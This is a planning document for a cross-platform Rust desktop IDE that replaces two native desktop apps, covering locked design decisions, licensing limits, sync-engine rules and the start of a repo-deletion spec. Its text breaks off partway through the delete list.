# Exponential — Masterplan v3 (Cross-Platform Desktop / gpui)

Masterplan v3 kills the two native desktop codebases — the Zig + GTK4 + libghostty Linux app (`apps/linux`) and the SwiftUI macOS target (`apps/ios/ExponentialMac`) — and replaces both with **one** cross-platform Rust desktop IDE at `apps/desktop`, built on gpui.rs + the longbridge gpui-component widget library + alacritty_terminal (embedded PTY) + a from-scratch Rust ElectricSQL sync client. It also re-privatizes iOS (`ExpCore`/`ExpUI` become iOS-only again) with a clean-code pass and the EXP-1#13 sync hardening. The end state is **four surfaces**: web/server + relays, Android, a cleaned self-contained iOS, and the new gpui desktop IDE — all syncing the same fourteen Electric shapes.

> **This document supersedes the desktop sections of `docs/masterplan.md` (v2)** — its §3.3 publisher framing, its entire §4 native desktop workstream, and every "five clients / web·iOS·Android·macOS·Linux" enumeration in v2 and `docs/vision.md`. **It inherits everything else from v2 verbatim** (the §2 data model and 14 synced shapes, the §3 relay wire protocol + steer-ticket format, the §7 GitHub/repositories server contract + MCP tools, §6 notifications/email, §8 billing). On any desktop / repo-cut / Rust-codegen / iOS-self-containment conflict, **v3 wins**; on everything else, v2 is authoritative and unchanged.

## Table of contents

- [0. Purpose & how to read this with masterplan v2](#0-purpose--how-to-read-this-with-masterplan-v2)
- [1. Thesis & locked decisions (v3)](#1-thesis--locked-decisions-v3)
- [2. Repo cut: delete / add / update + codegen + CI](#2-repo-cut-delete--add--update--codegen--ci)
- [3. Desktop app architecture (Rust: crates, threading, four pillars, build & packaging)](#3-desktop-app-architecture-rust-crates-threading-four-pillars-build--packaging)
- [4. UI parity + theming (web → gpui-component, compact density, hard interactions, EXP-1 chrome)](#4-ui-parity--theming-web--gpui-component-compact-density-hard-interactions-exp-1-chrome)
- [5. From-scratch Rust ElectricSQL sync client](#5-from-scratch-rust-electricsql-sync-client)
- [6. Embedded terminal (alacritty_terminal + PTY tee) — GPL-clean reimplementation](#6-embedded-terminal-alacritty_terminal--pty-tee--gpl-clean-reimplementation)
- [7. IDE features (Start-coding launcher, hidden key, DB run configs, play/stop, multi-window, diff, doctor)](#7-ide-features-start-coding-launcher-hidden-key-db-run-configs-playstop-multi-window-diff-doctor)
- [8. Remote steer publisher (control channel + session publisher, frozen wire protocol)](#8-remote-steer-publisher-control-channel--session-publisher-frozen-wire-protocol)
- [9. iOS self-containment + clean-code pass + EXP-1#13 carry-in (parallel track)](#9-ios-self-containment--clean-code-pass--exp-113-carry-in-parallel-track)
- [10. Explicit UNCHANGED set + EXP-1..EXP-5 traceability](#10-explicit-unchanged-set--exp-1exp-5-traceability)
- [11. Sequenced execution plan for Fable](#11-sequenced-execution-plan-for-fable)
- [12. Risks & open questions](#12-risks--open-questions)

---

## 0. Purpose & how to read this with masterplan v2

### 0.1 What this document is

`docs/masterplan-v3.md` is the authority for three tightly coupled changes to the Exponential repository:

1. **The desktop pivot** — killing the two native desktop codebases (`apps/linux`, a Zig + GTK4 + libghostty app; and `apps/ios/ExponentialMac`, the SwiftUI macOS target) and replacing both with **one** cross-platform Rust desktop IDE at `apps/desktop`, built on **gpui.rs** (the Apache-2.0 UI framework from Zed) + the **longbridge gpui-component** widget library + **alacritty_terminal** for the embedded terminal + a **from-scratch Rust ElectricSQL sync client**.
2. **The repo cut** — the concrete delete/add/update surface that pivot implies: removing `apps/linux` and its Zig codegen and VM docs, adding the `apps/desktop` Cargo workspace, adding Rust codegen targets to `packages/domain-contract` and a new `packages/design-tokens`, adding `build-desktop.yml` CI, and the one schema addition (`run_configs`).
3. **iOS self-containment** — today `apps/ios/ExpCore` and `ExpUI` are shared frameworks consumed by both the iOS app and the (deleted) macOS target. This doc re-privatizes them to iOS-only, deletes the mac target and its ghostty vendoring, and folds in a clean-code pass plus the EXP-1#13 sync hardening.

This document **supersedes** the desktop-facing portions of `docs/masterplan.md` (v2); it does **not replace** v2. v2 remains the spec of record for everything server-, data-, relay-, and mobile-side. When the two documents disagree on anything desktop, the repo cut, Rust codegen targets, or iOS self-containment, **v3 wins**. On everything else, v2 is authoritative and unchanged.

The product story is **intact and unchanged**: *issue → Start coding → steer from your phone → PR*. Only the desktop **implementation** changes — and it gets strictly better: a native PTY tee (instead of a webview shell), real side-by-side syntax-highlighted diff review, pixel-perfect shadcn chrome via a shared theme, JetBrains-style run configs, and true multi-window. The desktop remains the steer-relay **publisher** speaking the same frozen wire protocol phones already consume.

### 0.2 What v3 supersedes in v2 (v3 wins on conflict)

The following parts of `docs/masterplan.md` are **overridden** by this document. Fable must read the v3 version of these topics, not the v2 version:

- **§3.3 "publisher = a native host component (Zig/Swift)"** — the steer-relay publisher is now the Rust `steer` crate inside `apps/desktop` (§08 here). The *relay service* and *wire protocol* (v2 §3.0–3.2, §3.4, §3.5) are unchanged; only the identity and language of the publisher change.
- **The entire v2 §4 "Desktop IDE" workstream** — every part of it framed around native Linux (Zig/GTK4) + native macOS (SwiftUI). The desktop architecture (§03), UI parity (§04), sync engine (§05), terminal (§06), IDE features (§07), and steer publisher (§08) in *this* document replace it wholesale.
- **v2 §4e "Linux parity" and §4f "macOS glass" framing** — there is one desktop app targeting macOS + Linux from a single codebase; there is no Linux-specific parity workstream and no macOS-glass styling. The desktop uses one forced **Exponential Dark** theme on both platforms.
- **Every "five clients" / "web, iOS, Android, macOS, and Linux" enumeration** — anywhere in v2 *or* `docs/vision.md`. The post-cut reality is **four surfaces** (see §0.5). Prose in `vision.md` (its "Platform roles" table and platform lists), `CLAUDE.md`, and `handoff-mac.md` is updated to match as part of Phase 0/Phase 8.

Nothing else in v2 is superseded. If a v2 section is not named above, treat it as live.

### 0.3 What v3 inherits unchanged from v2 (still the spec of record)

These v2 sections are **inherited verbatim** and remain authoritative. Fable reads them in `docs/masterplan.md`; this document does not restate them and must not contradict them:

- **§2 target data model** — including the **14 synced Electric shapes** (workspaces, projects, issues, labels, issue_labels, users, workspace_members, workspace_invites, comments, attachments, notifications, issue_events, issue_subscribers, **coding_sessions**), **§2.5 coding_sessions**, **§2.6 notifications/email**, and **§2.7 widget helpdesk**. The desktop syncs exactly these 14 shapes — no more, no fewer. `repositories`, `project_repositories`, `user_notification_prefs`, `email_deliveries`, `run_configs`, and the widget tables stay **server-only (tRPC), never synced**.
- **§3.0–3.2 relay service + the two-channel wire protocol** — the control channel (device presence) and per-session channel (0x01 output frames, input injection, resize, claim/kill, ring replay) are **frozen**. The desktop `steer` crate (§08) implements the publisher side of exactly this protocol.
- **§3.4 claim model** and **§3.5 security / kill-switch** — the take-over/release semantics and the own-row Electric kill-switch are unchanged.
- **§3.6 self-host degradation** — `STEER_RELAY_URL` unset ⇒ remote start/steer off, gracefully. Unchanged.
- **§3.7 web/mobile viewer UI** — the phone-side steer viewer is unchanged; the desktop is its counterpart publisher.
- **§5 coordination clients (web + iOS + Android)** — unchanged; the desktop is an *additional* client, not a replacement for any of them.
- **§6 notifications / email / one-way helpdesk** — unchanged.
- **§7 GitHub / repositories / coding-first server contract** — including `repositories.forIssue` / installation-token minting, the MCP tools **`exponential_pr_open`** and **`exponential_issues_update_status`**, and the coding-first funnel. The desktop `coding` crate (§07) calls exactly these server procedures; it adds no new server contract except the `run_configs` table + `runConfigs` router owned here.
- **§8 billing moat + cut list** — unchanged. Billing (Creem) and the admin console stay **web-only**; the desktop shows no billing UI.

**Enum values and the DB schema are unchanged** except for the single new **`run_configs`** table (server-only, tRPC-managed), which is specified in §07 of this document. `packages/domain-contract/contract.json` enum *values* do not change — only a new Rust *emitter* is added (§02).

### 0.4 How Fable routes a question between the two documents

A simple rule for every task:

| If the task touches… | Read… |
|---|---|
| Server, tRPC routers, DB schema, Electric shape proxies, migrations, relay service, wire protocol, web UI, iOS runtime behavior, Android, notifications, billing, GitHub/MCP server contract | **`docs/masterplan.md` (v2)** |
| The desktop app (`apps/desktop`, any crate), the repo cut (deletes/adds), Rust codegen (`domain-contract` Rust emitter, `design-tokens`), the `run_configs` table + `runConfigs` router, iOS self-containment / clean-code / mac-target deletion, `build-desktop.yml` | **`docs/masterplan-v3.md` (this doc)** |

When a topic straddles both — e.g. the desktop `coding` crate calls the v2 `repositories.forIssue` procedure, or the desktop `steer` crate speaks the v2 relay protocol — the **interface** is defined by v2 and the **client of that interface** is defined by v3. Each v3 section names the v2 contract it consumes and does not redefine it.

### 0.5 The end state: four surfaces

After this plan lands, the repo has exactly **four product surfaces** (down from the current "five clients"):

- **(a) Web/server + relays** — `apps/web` (TanStack Start tracker + server + 14 shape proxies + all tRPC routers), `apps/push-relay`, `apps/steer-relay`, `apps/marketing`. **Unchanged** by this plan (except the additive `run_configs` table + `runConfigs` router in `apps/web`, and prose doc updates).
- **(b) Android native** — `apps/android`. **Unchanged**.
- **(c) iOS native** — `apps/ios`, **cleaned and self-contained**: the `ExponentialMac` target and ghostty vendoring deleted, `ExpCore`/`ExpUI` demoted to iOS-only frameworks, EXP-1#13 sync hardening carried in (§09).
- **(d) The new gpui desktop IDE** — `apps/desktop`, a standalone Rust Cargo workspace of nine crates (`app`, `ui`, `theme`, `domain`, `sync`, `api`, `terminal`, `steer`, `coding`) targeting macOS + Linux (Windows deferred, door left open). This is the whole point of v3 (§03–§08).

All four surfaces sync the **same 14 Electric shapes in lockstep**. The desktop is a *first-class* sync client on equal footing with web/iOS/Android — not a webview wrapper.

### 0.6 The archive: study, never resurrect

The two dropped native desktop codebases are **not deleted from history** — they are preserved as reference specifications:

- **Git branch `archive/native-desktop-wave1-2`** holds the last good state of the native Zig Linux app and the SwiftUI macOS target, including the hardening that was dropped when those apps were cut. Fable should **study** the proven native sync engines there — the Swift `apps/ios/ExpCore/Sources/Electric/` (`ShapeClient.swift`, `SyncManager.swift`, `ShapeMessage.swift`) and the Zig `apps/linux/src/core/` — as working reference implementations of the Electric long-poll/409/offset protocol the new Rust `sync` crate must reimplement (§05).
- The **EXP-1#13 sync hardening** (dead-bearer → anon-shape degradation → Electric 409 must-refetch → URLCache-poisoned empty snapshot; the client-side fixes) lives on that branch at **commit `f31a631`**. Both the Rust `sync` crate (§05) and the iOS carry-in (§09) reimplement this from that reference.
- The pre-cut `master` history (before Phase 0) is also a valid reference for the deleted files.

**Rule: these archives are read-only reference specs. Never resurrect the Zig or SwiftUI-mac code into the tree.** The new desktop is a clean-room reimplementation, and the licensing boundary in §0.7 is absolute.

### 0.7 The licensing boundary (load-bearing)

Every crate `apps/desktop` *depends on* is Apache-2.0 or MIT:

- **gpui** (0.2.x, from Zed) — **Apache-2.0**. Safe to depend on.
- **gpui-component** (longbridge, v0.5.x) — **Apache-2.0**. Safe to depend on.
- **alacritty_terminal** 0.26 (upstream) — **Apache-2.0**. We depend on the *upstream* crate, **not** Zed's pinned GPL fork.

Zed's own **`crates/terminal` and `crates/terminal_view` are GPL-3.0-or-later**. They are downloaded locally as reference (see §06) and may be **studied to learn the alacritty_terminal → gpui integration**, but **their code must never be copied** into our (non-GPL) desktop app. The `terminal` crate (§06) is a **clean reimplementation** of that integration. This boundary is non-negotiable and is called out again in §03 and §06.

### 0.8 Gate for this document

This is a **planning document that Fable executes later, without the author present**, and without re-reading the research corpus (the downloaded Zed + gpui-component sources, the EXP issue text, the archived branches). Therefore every desktop, iOS, and repo-cut decision in the sections below is written to be **concrete enough to execute directly**: named crates and versions, exact module paths and file names, real gpui-component component names, real tRPC procedures and MCP tools, explicit delete/create lists, and per-phase gates. Where a decision is genuinely unresolved, it is marked inline as **"Open question:"** rather than left implicit. If Fable finds a needed fact absent from this document, the correct move is to consult the named ground-truth source (the repo, the downloaded refs, or the specific v2 section) — not to improvise.

The execution is sequenced into **Phase 0 through Phase 8** (§11), each with an explicit gate. Phase 0 is the repo cut + codegen + CI scaffold; Phases 1–6 build the desktop bottom-up (skeleton → sync → UI → terminal → IDE features → steer publisher); Phase 7 is the parallel iOS track; Phase 8 is green + release. No phase is "done" until its gate passes.


---

## 1. Thesis & locked decisions (v3)

### 1.1 Thesis

Exponential today ships **five** clients that sync the same fourteen Electric shapes: the web tracker (`apps/web`), iOS (`apps/ios`), Android (`apps/android`), a native macOS SwiftUI app (`apps/ios/ExponentialMac`), and a native Linux desktop app (`apps/linux`, Zig + GTK4 + libghostty). The two native **desktop** codebases are the problem child. They were built and hardened across v2 waves 1–2, then declared EOL by the 2026-07-02 pivot recorded in `docs/handoff-mac.md`: two entirely separate languages and UI toolkits (Swift/SwiftUI on macOS, Zig/GTK4 on Linux), two separate sync engines, two separate embeddings of ghostty as the terminal, two separate copies of every screen — and neither reaches pixel-parity with web (that is the whole of EXP-1). Maintaining desktop parity means writing every feature three times (web, mac, linux) in three languages. That does not scale, and it is why the native desktop UI drifted.

**v3 kills both native desktop codebases and replaces them with ONE cross-platform Rust IDE.** Concretely:

- **DELETE `apps/linux` entirely** — the Zig + GTK4 + libghostty app, **53 git-tracked files** (verified: `git ls-files apps/linux | wc -l` → 53), including its own from-scratch sync engine in `src/core/` and the vendored ghostty terminal. Gone, not ported.
- **DELETE the macOS target `apps/ios/ExponentialMac`** — 46 Swift files plus all mac-only scaffolding (the ghostty vendoring, the `#if os(macOS)` shim branches threaded through `ExpCore`/`ExpUI`, the mac Tuist targets/schemes, the file-based credential store). Gone.
- **REPLACE both with ONE new app at `apps/desktop`** — a standalone Rust Cargo workspace building a single binary (`exp-desktop`) that runs on macOS **and** Linux from one codebase. It is a **1:1 copy of the web experience** (pixel-parity shadcn look) **plus real IDE powers**: an embedded terminal running the `claude` CLI, JetBrains-style DB-backed run configs, multi-tab terminals, side-by-side syntax-highlighted PR diff review, multi-window, the "Start coding" launcher, and being the **steer-relay publisher** (tee the terminal out to phones, inject remote input).
- **SEPARATE iOS so it is self-contained again.** Today `ExpCore` and `ExpUI` are *shared* frameworks consumed by both the iOS app and the now-deleted mac target. With the mac target gone they revert to iOS(+iPad)-only frameworks and get a clean-code pass (§09).

The **end state of the repo is four surfaces**, not five clients:

1. **web/server + relays** — `apps/web`, `apps/push-relay`, `apps/steer-relay`, `apps/marketing`. *Unchanged by this plan* (the one exception is one additive `run_configs` table + a `runConfigs` tRPC router; see LD-10).
2. **Android native** — `apps/android`. *Unchanged.*
3. **iOS native** — `apps/ios`, cleaned up and self-contained (§09).
4. **NEW gpui desktop IDE** — `apps/desktop` (Rust). *The whole point of v3.*

This is a **hard cut**, consistent with the v2 masterplan's own methodology (`docs/masterplan.md` was a v2 hard-cut refactor). We do not run the native desktop apps and the new desktop app in parallel; the native desktop code is deleted in Phase 0 and the new app is built forward. The archived native work already lives on the local git branch `archive/native-desktop-wave1-2` (recorded in MEMORY.md), so deletion is non-destructive to history — nothing is being thrown away, only removed from `master`.

**Inheritance from v2.** v3 supersedes only the *desktop* framing of the v2 masterplan — its §3 (steer relay client role) and §4 (native launcher) desktop sections, and the pervasive "five-client / 14-shape across five clients" language. Everything else is **inherited verbatim**: the data model (v2 §2), the server contract and GitHub/repositories flow (v2 §7), the steer-relay **wire protocol and ticket format** (v2 §3), notifications (v2 §6), and billing (v2 §8, web-only). The desktop app is a *new consumer* of those frozen contracts, never a redefiner of them.

### 1.2 Locked decisions

These are decisions, not options. Where a choice is genuinely still open it is called out inline as **Open question** and tracked in §12. Fable executes these as written.

---

**LD-1 — The four load-bearing pillars (all permissively licensed).** The desktop app stands on exactly four dependency pillars, every one Apache-2.0 or MIT:

1. **gpui.rs** — the GPU-accelerated UI framework extracted from Zed. Apache-2.0. Core crate `gpui` (the crates.io line is `0.2.2`, but we do **not** use crates.io — see LD-7) plus `gpui_platform` (the backend selector: `gpui_macos` = Metal, `gpui_linux`/`gpui_wgpu` = wgpu since Blade was removed Feb 2026, `gpui_windows`). Hybrid immediate+retained model: one `App` owns all state; `Entity<T>` handles created via `cx.new(…)`; mutation through `entity.update(cx, |state, cx| { …; cx.notify() })`; views implement `Render` and build a Tailwind-parity element tree via the `Styled` builder (`div().flex().gap_2()…`) laid out by **Taffy 0.10.1**; reactivity is observe/notify + subscribe/emit; a foreground (main-thread, `!Send`) + background (thread-pool) executor pair.
2. **gpui-component** (longbridge) — Apache-2.0, crate **v0.5.2** (verified in the vendored `gpui-component/crates/ui/Cargo.toml`). ~60 shadcn-parity widgets + a shadcn-token `Theme`, the `dock` system (left/right/bottom docks + `Panel`), and a Tree-sitter `highlighter` (syntax highlighting for the diff view). It pins gpui to an **exact git rev** (see LD-7).
3. **alacritty_terminal 0.26.0 UPSTREAM** — Apache-2.0, the **upstream** crate, **NOT** Zed's GPL fork. Used for `Term`/`Grid`/parser state only. Paired with **portable-pty 0.9** (MIT — we own the PTY master) and **vte 0.15** (with the `ansi` feature) for the escape-sequence parser.
4. **A from-scratch Rust ElectricSQL sync client** — no off-the-shelf Electric crate exists; we write it. Transport is **`ureq`** (blocking HTTP) over **`rustls`**; persistence is **`rusqlite`** in **WAL** mode. Details are owned by §05; the protocol conformance target is the `packages/electric-protocol` fixtures.

No other pillar is load-bearing. Supporting crates (`tokio-tungstenite` + `rustls` for the steer publisher, `git2` or shelling `git` for the launcher, `serde`/`serde_json`, `flume`/`crossbeam-channel`, `open`/`opener`) are named in their owning sections.

---

**LD-2 — Delete the two native desktop codebases.** `apps/linux` (53 tracked files) and `apps/ios/ExponentialMac` (46 Swift files) plus all mac-only scaffolding are deleted. The full delete/add/update manifest, codegen changes, and CI scaffold are owned by **§02 (Repo cut)** and the iOS-side deletions by **§09 (iOS cleanup)**. This decision is the premise of the whole document.

---

**LD-3 — iOS becomes self-contained again.** `ExpCore` and `ExpUI` revert from shared iOS+macOS frameworks to **iOS(+iPad)-only** frameworks. `Project.swift` is rewritten to 7 iOS targets / 4 schemes (the mac target removed), the `#if os(macOS)` conditionals are stripped, and the file-based mac credential store collapses back into the iOS `KeychainStore` (preserving the shared access group so Share-to-Exponential keeps reading the token). Owned by **§09**.

---

**LD-4 — web/server, push-relay, steer-relay, marketing, and Android are UNCHANGED.** This plan does not touch `apps/web`, `apps/push-relay`, `apps/steer-relay`, `apps/marketing`, or `apps/android`, with **exactly one** additive exception: the `run_configs` server-only table + `runConfigs` tRPC router (LD-10). No Electric shape is added, removed, or reshaped — the count stays **14**. The steer-relay is not modified at all; the desktop simply becomes its publisher over the already-frozen protocol (LD-11). The explicit UNCHANGED set and the EXP-1..EXP-5 traceability matrix are owned by **§10**.

---

**LD-5 — Target macOS (Metal) + Linux (wgpu) for v1; keep Windows compiling, don't gate on it.** v1 ships **macOS** (Metal backend) and **Linux** (wgpu backend, both Wayland and X11 — the vendored `gpui_platform` already enables `["x11", "wayland"]` features). Windows is kept *compiling* where cheap (the `gpui_windows` backend exists) but **no phase gate, CI job, or acceptance test depends on Windows**. We do not vendor Windows-specific code paths; we simply avoid `#[cfg(unix)]`-only assumptions where a portable alternative is free. Windows is a post-v1 door left open, not a v1 deliverable.

---

**LD-6 — The GPL boundary is absolute.** Zed's `crates/terminal` and `crates/terminal_view` are **GPL-3.0-or-later**. We **study** them to learn the alacritty_terminal↔gpui integration (they are the best reference in existence for painting a terminal grid as a gpui `Element` and for the key-encoding table) but we **never copy a line** into our (non-GPL, permissively-licensed) app. Our `terminal` crate is a **clean reimplementation over the upstream Apache-2.0 alacritty_terminal**, with our own PTY ownership, our own read-loop tee, our own `to_esc_str` key table, and our own grid `Element`. Everything else we depend on — `gpui`, `gpui-component`, `alacritty_terminal` (upstream), `portable-pty`, `vte` — is Apache-2.0 or MIT and safe to link and ship. The reimplementation mandate is owned by **§06**; this LD is the license contract it honors.

> The downloaded study references live at `/Users/niach/.claude/jobs/f54ce572/tmp/zed/crates/terminal/` and `.../terminal_view/` (GPL — read only) and `.../gpui/`, `.../gpui-component/` (permissive — may inform code). Fable must treat the two `terminal*` dirs as read-only inspiration and produce original code.

---

**LD-7 — Version discipline: pin gpui to gpui-component's EXACT rev; bump the pair together.** gpui-component **v0.5.2** pins gpui to the Zed git rev **`1d217ee39d381ac101b7cf49d3d22451ac1093fe`** (verified in the vendored `gpui-component/Cargo.toml`: `gpui = { git = "https://github.com/zed-industries/zed", rev = "1d217ee39d381ac101b7cf49d3d22451ac1093fe" }`, and the same rev for `gpui_platform`, `gpui_macros`, `reqwest_client`). Our `apps/desktop/Cargo.toml` **must pin `gpui`, `gpui_platform`, and `gpui_macros` to that identical rev.** Mixing the crates.io `gpui 0.2.2` release with the git-pinned component is forbidden — gpui's internal APIs (`Entity`, `Render`, `Element`, `Styled`) drift between revs and a mismatch produces trait-coherence errors that look like unrelated bugs. When we upgrade gpui-component, we bump the whole `{ gpui, gpui_platform, gpui_macros }` triple to the new component's rev **in one deliberate PR**, never piecemeal.

```toml
# apps/desktop/Cargo.toml (workspace deps — the pinned triple)
[workspace.dependencies]
gpui          = { git = "https://github.com/zed-industries/zed", rev = "1d217ee39d381ac101b7cf49d3d22451ac1093fe" }
gpui_platform = { git = "https://github.com/zed-industries/zed", rev = "1d217ee39d381ac101b7cf49d3d22451ac1093fe", features = ["font-kit", "x11", "wayland", "runtime_shaders"] }
gpui_macros   = { git = "https://github.com/zed-industries/zed", rev = "1d217ee39d381ac101b7cf49d3d22451ac1093fe" }
gpui-component = { git = "https://github.com/longbridge/gpui-component", rev = "a9a7341c35b62f27ff512371c62419342264710c" } # git pin — registry 0.5.x would split gpui package ids (§3.1)
```

The exact toolchain channel is pinned in `apps/desktop/rust-toolchain.toml` (`channel = "1.96.0"`, validated by Spike B against the pinned rev's own examples — see §3.7). See §03 for the workspace/toolchain layout.

---

**LD-8 — Compact UI, measurably smaller than web (EXP-2f).** The desktop UI is deliberately denser than web. This is achieved in the `theme` crate, not ad-hoc per view: the gpui-component `Theme` is built with `font_size` ≈ **13–14px** (web is 16px), corner `radius` ≈ **4–5px** (web is 8px), components default to the `.small()` / `.xsmall()` size variants that gpui-component exposes (`Button::new(...).small()`, `Input`/`Dropdown` small variants), and row heights (issue list rows, sidebar items, table rows) are tightened. "Measurably smaller" is a **gate**, not a vibe: §04 owns the density spec and the side-by-side pixel-diff acceptance. The compact density is applied globally at theme-init time so every screen inherits it.

---

**LD-9 — Hidden, auto-minted personal `expu_` key (EXP-2a).** The personal Better Auth API key used for local coding (the `.mcp.json` credential, `expu_` prefix) is **never a manual field** in any settings screen. It is **auto-minted** on the first "Start coding" session via the users/apikeys tRPC path, stored in the **file-based token store** (`0600` file / `0700` dir — **locked decision 2026-07-03: always file-based, never the OS keyring**; unsigned dev binaries re-prompt the macOS Keychain on every rebuild, and Secret Service is absent on headless Linux), and surfaced in settings only as a **Regenerate** action (which mints a new key and invalidates the old). No copy-paste, no "enter your API key" input. This directly kills EXP-2a. The minting/storage mechanics are owned by **§07** (launcher + key) and the key store by the `api` crate (§03).

---

**LD-10 — Run configs live in the DATABASE, not the repo (EXP-2d).** Run configurations are **not** files in the user's repo (no `.exp/run.toml`, no committed JSON). They are rows in a new **server-only** `run_configs` table, mutated via a new **`runConfigs` tRPC router**, and each run config is essentially *a terminal command to launch in a terminal tab* (plus a working directory and optional env). This is the **only schema addition** in v3 (`packages/db-schema` gains the table; it is server-only/tRPC, **never** an Electric shape — the shape count stays 14). Launching a run config on a machine is gated by a per-device **Trust & Run** prompt (arbitrary shell commands from the DB must be user-approved per device, re-prompting when the command text changes). The table shape, router procedures (`runConfigs.list/create/update/delete`), and the Trust gate are owned by **§07**; the migration + schema by **§02**.

---

**LD-11 — The desktop is the steer-relay PUBLISHER; wire protocol and ticket format are FROZEN.** In v2 the native desktop was already the steer publisher; v3 keeps that role for the new app. The desktop dials **out** to the steer-relay over `tokio-tungstenite` + `rustls` (supporting both `wss://` for the TLS cloud relay and `ws://` for a LAN relay), registers device presence on a control channel, receives inbound `start_session` commands (which drive the Start-coding launcher), and per session **tees** the terminal PTY output out as `0x01` frames while **injecting** remote input, honoring resize/claim/kill/ring-replay. The **wire protocol and the steer-ticket format are FROZEN** — defined by `apps/steer-relay` and `packages/steer-ticket`, both UNCHANGED (LD-4). The desktop **consumes server-minted tickets** and never signs its own (no HS256 secret on the client). Owned by **§08**; the terminal-side tee interface is owned by **§06** and consumed here.

---

**LD-12 — Ditch the preview feature; drop the dead Google Calendar panel.** The v2 "preview" feature (EXP-2c) is **deleted, not ported** — the new desktop app has no preview surface at all. Separately, the stale Google Calendar entry in the integrations menu (EXP-1 #9) is **not** carried into the desktop integrations screen; the desktop shows only the integrations that exist (GitHub). These are *subtractions*: Fable must resist the reflex to reimplement them "for parity." The correct parity is with **current web**, which has no preview and no Calendar integration.

---

**LD-13 — Sync-engine correctness from day one (EXP-1 #13).** The new Rust sync engine must handle the hard-won Electric gotchas *from the first commit* — these are not later hardening, they are day-one requirements, because EXP-1 #13 ("all issues vanished + projects empty") was exactly this class of bug and the client-side fixes were lost when the native apps were dropped:

- **No URL-keyed HTTP cache.** Shape responses carry `cache-control: private, no-store` and `vary: authorization, x-api-key, cookie`. The engine must **never** cache a shape body under a shared/HTTP cache keyed only by URL. (This is the root cause of the macOS URLCache poisoning: a cross-auth anonymous empty snapshot got served from cache.)
- **401 → re-auth, never anonymous-degrade.** A request whose token credentials fail to resolve gets an explicit **401**; the engine must route to **login/re-auth**, never silently fall back to the anonymous where-clause (which yields an empty board that looks like data loss).
- **Sorted where-clause id lists.** The where clause is part of Electric's shape identity; heap-order flips rotate shape handles into 409 loops. The desktop inherits this **for free by never sending a client-authored `where`** — the shape proxies own the where clause server-side; the client only presents credentials. (If the client ever must send an id list, it sorts it.)
- **409 must-refetch = atomic re-adopt.** On a 409 (Electric "must-refetch") the engine re-fetches that shape from `offset=-1`, and applies the fresh snapshot as an **atomic `DELETE` + `INSERT` in one rusqlite transaction** that adopts the **new shape handle** — so the UI never observes an empty intermediate state (no empty-table flicker). It must **not** serve a stale cached body during the refetch.

The reference implementations to learn from (not copy — different languages) are the proven Swift engine (`apps/ios/ExpCore/Sources/Electric/`: `ShapeClient.swift`, `SyncManager.swift`, `ShapeMessage.swift`) and the dropped Zig engine (`apps/linux/src/core/`, being deleted). The dropped hardening also lives on `archive/native-desktop-wave1-2`. Full ownership is **§05**.

---

**LD-14 — Theme source of truth is `@exp/design-tokens` Rust codegen; NO hand-authored theme JSON.** The desktop theme is **generated**, not hand-written. `packages/design-tokens` gains a **Rust emitter** that produces `apps/desktop/crates/theme/src/tokens.generated.rs` — a set of `Srgb8` byte-triple constants (the committed, generated single source of truth). The `theme` crate then builds the gpui-component `ThemeColor` (a set of `Hsla` values) **programmatically in Rust** from those consts via a hand-written `Srgb8 → gpui::Rgba → Hsla` map. We do **not** author a theme `*.json` file, for two concrete reasons: (1) the gpui-component JSON theme parser **cannot read `oklch()`** color syntax, and our palette is OKLCH zinc; (2) it has **no named `"zinc"` color**. Doing an **offline OKLCH→sRGB conversion in the emitter** and mapping `Srgb8→Hsla` in Rust dodges both problems and keeps web and desktop provably in lockstep (regenerate on token change; a CI generator-drift guard fails on any diff). The codegen wiring is owned by **§02**; the color-space math and `ThemeColor` construction by **§04**.

---

### 1.3 What these decisions add up to

Taken together the fourteen locked decisions define a repo that goes from **five clients to four surfaces** by trading two hand-maintained native desktop stacks for **one** Rust IDE that (a) looks like web because its theme is *generated from the same tokens* (LD-14) at a deliberately denser scale (LD-8), (b) syncs correctly because it honors the Electric contract from day one (LD-13), (c) has real IDE power because it owns a clean-room terminal (LD-6) it can tee to phones (LD-11), (d) launches `claude` with a hidden auto-minted key (LD-9) and DB-backed run configs (LD-10), and (e) drops the dead weight (LD-12) — all while leaving web/server, relays, and Android untouched (LD-4) and giving iOS its independence back (LD-3). The remaining sections turn each of these into an executable spec; the sequenced build order for Fable is **§11 (Phases 0–8)**, and the mapping from every EXP-1..EXP-5 sub-point to the decision that resolves it is **§10**.


---

## 2. Repo cut: delete / add / update + codegen + CI

This section is the mechanical spec for **Phase 0** — the surgical edit that turns the five-client repo into the four-surface repo. It has zero database, schema, migration, or Electric-shape impact: the 14 synced shapes are untouched and `contract.json`'s enum values are byte-for-byte identical before and after. All that changes is (a) the Zig desktop client and its dead VM docs are deleted, (b) an empty-but-buildable `apps/desktop/` Rust Cargo workspace is added, (c) the two codegen scripts swap their Zig targets for committed Rust targets, (d) CI gains one purely-additive `build-desktop.yml`, and (e) the docs (`CLAUDE.md`, plus `vision.md`/`masterplan.md` handled in Phase 8) are re-worded to the new reality. The `run_configs` table and the macOS-native Swift deletion are **out of scope here** — `run_configs` is owned by [07-ide-features] (server-only, tRPC), and the `apps/ios/ExponentialMac` target deletion is owned by [09-ios-cleanup]. This section only touches `apps/linux`, the two `packages/*/scripts/generate.ts`, root config, and `.github/workflows/`.

The guiding invariant: **`bun` never learns about `apps/desktop`.** bun treats a directory as a workspace only when it contains a `package.json`; verified against `bun.lock`, which lists only `apps/marketing`, `apps/push-relay`, `apps/steer-relay`, `apps/web` and the `packages/*`. `apps/linux` (a Zig project, no `package.json`) was likewise never in `bun.lock`. So deleting `apps/linux` and adding `apps/desktop` both cause **zero** workspace churn — no `workspaces` array edit, no `bun.lock` diff. Keep `apps/desktop` `package.json`-free forever; it is a Cargo workspace driven by `cargo`, shelled out to from root `package.json` scripts (the same pattern as `android:build`).

### 2.1 DELETE (git rm)

Run `git rm -r` (not a plain filesystem delete — these must leave the index) for the following. The exact tracked-file count is authoritative: `git ls-files apps/linux | wc -l` == **53** at the time of writing; Fable should delete the whole directory, not cherry-pick.

- **`apps/linux/**` — the entire Zig + GTK4 + libghostty desktop client (53 tracked files).** This includes:
  - `apps/linux/build.zig` and `apps/linux/build.zig.zon` — the Zig build graph and libghostty/GTK dependency pins.
